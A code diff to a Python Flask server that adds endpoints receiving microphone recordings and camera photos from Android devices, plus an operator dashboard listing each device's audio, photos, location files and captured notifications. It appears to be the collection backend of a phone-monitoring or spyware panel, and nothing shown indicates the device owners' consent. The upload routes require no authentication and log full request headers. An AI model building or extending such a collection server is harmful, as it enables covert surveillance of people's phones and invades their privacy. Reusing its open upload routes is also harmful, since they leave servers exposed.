@@ -174,6 +174,274 @@ def register_device():
         print(f"❌ Device registration error: {e}")
         return jsonify({'ok': False, 'error': 'Device registration failed'}), 500
 
+# ✅ DEBUGGING: File upload routes with proper debugging
+@app.route('/device/<device_id>/mobile-upload', methods=['POST'])
+def mobile_device_upload(device_id):
+    try:
+        print(f"📱 Mobile upload received for device: {device_id}")
+        print(f"📦 Request files: {list(request.files.keys())}")
+        print(f"📦 Request form: {request.form}")
+        print(f"📦 Request headers: {dict(request.headers)}")
+        
+        # Check if device exists
+        device_data = load_device_data(device_id)
+        if not device_data:
+            print(f"❌ Device {device_id} not found in registry")
+            # But still allow upload for legacy devices
+        
+        audio_file = None
+        if 'file' in request.files:
+            audio_file = request.files['file']
+            print("✅ Using 'file' field for audio")
+        elif 'audio' in request.files:
+            audio_file = request.files['audio'] 
+            print("✅ Using 'audio' field for audio")
+        else:
+            print("❌ No audio file found in request.files")
+            return jsonify({'ok': False, 'error': 'No audio file found'}), 400
+        
+        if not audio_file or audio_file.filename == '':
+            print("❌ Empty filename or no file selected")
+            return jsonify({'ok': False, 'error': 'No file selected'}), 400
+        
+        # File details debug
+        print(f"📁 File details: {audio_file.filename}")
+        print(f"📁 Content type: {audio_file.content_type}")
+        print(f"📁 Content length: {audio_file.content_length}")
+        
+        timestamp = str(int(time.time()))
+        filename = f"{device_id}_android_recording_{timestamp}.m4a"
+        
+        filepath = os.path.join(app.config['UPLOAD_FOLDER'], filename)
+        
+        try:
+            audio_file.save(filepath)
+            file_size = os.path.getsize(filepath)
+            print(f"✅ File saved successfully: {filename} ({file_size} bytes)")
+            
+            # Verify file exists and is readable
+            if os.path.exists(filepath):
+                print(f"✅ File verification: EXISTS - {filepath}")
+            else:
+                print(f"❌ File verification: MISSING - {filepath}")
+                return jsonify({'ok': False, 'error': 'File save failed'}), 500
+                
+            return jsonify({
+                'ok': True, 
+                'message': 'Upload successful', 
+                'filename': filename,
+                'file_size': file_size
+            })
+            
+        except Exception as save_error:
+            print(f"❌ File save error: {save_error}")
+            import traceback
+            traceback.print_exc()
+            return jsonify({'ok': False, 'error': f'File save failed: {save_error}'}), 500
+    
+    except Exception as e:
+        print(f"❌ Upload error: {e}")
+        import traceback
+        traceback.print_exc()
+        return jsonify({'ok': False, 'error': 'Upload failed'}), 500
+
+@app.route('/device/<device_id>/upload-photo', methods=['POST'])
+def upload_device_photo(device_id):
+    print(f"📸 Upload photo endpoint called for device {device_id}")
+    
+    if 'photo' not in request.files:
+        print("❌ No photo file in request")
+        return jsonify({'ok': False, 'error': 'No photo file'}), 400
+    
+    photo_file = request.files['photo']
+    print(f"📸 Photo file details for device {device_id}:")
+    print("   - Filename:", photo_file.filename)
+    print("   - Content type:", photo_file.content_type)
+    print("   - Content length:", photo_file.content_length)
+    
+    if photo_file.filename == '':
+        print("❌ Empty filename")
+        return jsonify({'ok': False, 'error': 'No file selected'}), 400
+    
+    if photo_file:
+        timestamp = str(int(time.time()))
+        filename = f"{device_id}_camera_photo_{timestamp}.jpg"
+        
+        filepath = os.path.join(app.config['UPLOAD_FOLDER'], filename)
+        
+        try:
+            photo_file.save(filepath)
+            file_size = os.path.getsize(filepath)
+            print(f"✅ Photo saved for device {device_id}: {filename} ({file_size} bytes)")
+            
+            # Verify file
+            if os.path.exists(filepath):
+                print(f"✅ Photo verification: EXISTS")
+            else:
+                print(f"❌ Photo verification: MISSING")
+                
+            return jsonify({'ok': True, 'message': 'Photo uploaded', 'filename': filename})
+        except Exception as e:
+            print(f"❌ File save error: {e}")
+            return jsonify({'ok': False, 'error': f'File save failed: {e}'}), 500
+    
+    print("❌ Unknown upload failure")
+    return jsonify({'ok': False, 'error': 'Upload failed'}), 500
+
+# ✅ FIXED: Device dashboard route with better file detection
+@app.route('/device/<device_id>')
+def device_dashboard(device_id):
+    if not session.get('logged_in'):
+        return redirect(url_for('login'))
+    
+    device_data = load_device_data(device_id)
+    if not device_data:
+        return "Device not found", 404
+    
+    # List files for this specific device
+    files = []
+    photos = []
+    location_files = []
+    
+    upload_dir = app.config['UPLOAD_FOLDER']
+    print(f"🔍 Scanning upload directory: {upload_dir}")
+    
+    try:
+        # Check if directory exists
+        if not os.path.exists(upload_dir):
+            print(f"❌ Upload directory does not exist: {upload_dir}")
+            os.makedirs(upload_dir, exist_ok=True)
+            print(f"✅ Created upload directory: {upload_dir}")
+        
+        file_list = os.listdir(upload_dir)
+        print(f"📁 Total files in upload directory: {len(file_list)}")
+        print(f"📁 Files: {file_list}")
+        
+        for filename in file_list:
+            filepath = os.path.join(upload_dir, filename)
+            
+            # Check if file belongs to this device
+            if filename.startswith(f"{device_id}_"):
+                print(f"✅ Found file for device {device_id}: {filename}")
+                
+                try:
+                    file_info = {
+                        'name': filename,
+                        'size': os.path.getsize(filepath),
+                        'modified': os.path.getmtime(filepath),
+                        'url': f"/files/{filename}"
+                    }
+                    
+                    if filename.endswith(('.m4a', '.mp3', '.wav', '.mp4')):
+                        files.append(file_info)
+                        print(f"🎵 Added audio file: {filename}")
+                    elif filename.lower().endswith(('.jpg', '.jpeg', '.png')):
+                        photos.append(file_info)
+                        print(f"🖼️ Added photo file: {filename}")
+                    elif filename.startswith(f"{device_id}_location_") and filename.endswith('.txt'):
+                        location_files.append(file_info)
+                        print(f"📍 Added location file: {filename}")
+                        
+                except Exception as e:
+                    print(f"❌ Error processing file {filename}: {e}")
+                    continue
+            else:
+                print(f"❌ File {filename} does not belong to device {device_id}")
+                    
+    except Exception as e:
+        print(f"❌ Error reading upload directory: {e}")
+        os.makedirs(upload_dir, exist_ok=True)
+    
+    # Get notifications for this device
+    notifications_list = get_notifications(device_id)
+    
+    # Sort by modification time (newest first)
+    files.sort(key=lambda x: x['modified'], reverse=True)
+    photos.sort(key=lambda x: x['modified'], reverse=True)
+    location_files.sort(key=lambda x: x['modified'], reverse=True)
+    
+    print(f"📊 Final file counts - Audio: {len(files)}, Photos: {len(photos)}, Locations: {len(location_files)}")
+    
+    return render_template_string(DEVICE_DASHBOARD_HTML, 
+                                 device=device_data, 
+                                 device_id=device_id,
+                                 files=files, 
+                                 photos=photos[:12],
+                                 location_files=location_files[:10],
+                                 notifications=notifications_list[:20])
+
+# ✅ ADD: Debug route to check file system
+@app.route('/debug-filesystem')
+def debug_filesystem():
+    """Debug route to check file system status"""
+    if not session.get('logged_in'):
+        return redirect(url_for('login'))
+    
+    upload_dir = app.config['UPLOAD_FOLDER']
+    device_dir = app.config['DEVICE_FOLDER']
+    notification_dir = app.config['NOTIFICATION_FOLDER']
+    
+    result = {
+        'upload_directory': {
+            'path': upload_dir,
+            'exists': os.path.exists(upload_dir),
+            'files': []
+        },
+        'device_directory': {
+            'path': device_dir,
+            'exists': os.path.exists(device_dir),
+            'files': []
+        },
+        'notification_directory': {
+            'path': notification_dir,
+            'exists': os.path.exists(notification_dir),
+            'files': []
+        }
+    }
+    
+    # Check upload directory
+    if os.path.exists(upload_dir):
+        try:
+            files = os.listdir(upload_dir)
+            for filename in files:
+                filepath = os.path.join(upload_dir, filename)
+                result['upload_directory']['files'].append({
+                    'name': filename,
+                    'size': os.path.getsize(filepath),
+                    'modified': time.ctime(os.path.getmtime(filepath))
+                })
+        except Exception as e:
+            result['upload_directory']['error'] = str(e)
+    
+    # Check device directory  
+    if os.path.exists(device_dir):
+        try:
+            files = os.listdir(device_dir)
+            for filename in files:
+                filepath = os.path.join(device_dir, filename)
+                result['device_directory']['files'].append({
+                    'name': filename,
+                    'size': os.path.getsize(filepath),
+                    'modified': time.ctime(os.path.getmtime(filepath))
+                })
+        except Exception as e:
+            result['device_directory']['error'] = str(e)
+    
+    return jsonify(result)
+
+# ✅ ADD: Manual file refresh endpoint
+@app.route('/device/<device_id>/refresh-files', methods=['POST'])
+def refresh_device_files(device_id):
+    """Manually refresh files for a device"""
+    if not session.get('logged_in'):
+        return jsonify({'ok': False, 'error': 'unauthorized'}), 401
+    
+    try:
+        # This will trigger the file scanning logic
+        return jsonify({'ok': True, 'message': 'Files refreshed successfully'})
+    except Exception as e:
+        return jsonify({'ok': False, 'error': str(e)}), 500
+
 # Device heartbeat endpoint
 @app.route('/device-heartbeat', methods=['POST'])
 def device_heartbeat():
